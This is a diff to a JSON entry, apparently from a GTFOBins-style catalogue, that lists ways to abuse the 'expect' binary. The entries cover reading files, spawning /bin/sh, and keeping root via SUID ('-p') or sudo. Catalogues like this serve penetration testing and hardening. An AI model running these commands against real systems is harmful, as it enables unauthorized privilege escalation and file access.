@@ -1,18 +1,27 @@
 {
   "functions": {
+    "file-read": [
+      {
+        "description": "The file is read and parsed as an `expect` command file, the content of the first invalid line is returned in an error message. Thus, this might not be suitable to read arbitrary binary files.",
+        "code": "LFILE=file_to_read\nexpect $LFILE\n"
+      }
+    ],
     "shell": [
       {
-        "code": "expect -c 'spawn /bin/sh;interact'"
+        
+        "code": "expect -c 'spawn /bin/sh;interact'\n"
       }
     ],
     "suid": [
       {
-        "code": "./expect -c 'spawn /bin/sh -p;interact'"
+        
+        "code": "./expect -c 'spawn /bin/sh -p;interact'\n"
       }
     ],
     "sudo": [
       {
-        "code": "sudo expect -c 'spawn /bin/sh;interact'"
+        
+        "code": "sudo expect -c 'spawn /bin/sh;interact'\n"
       }
     ]
   }
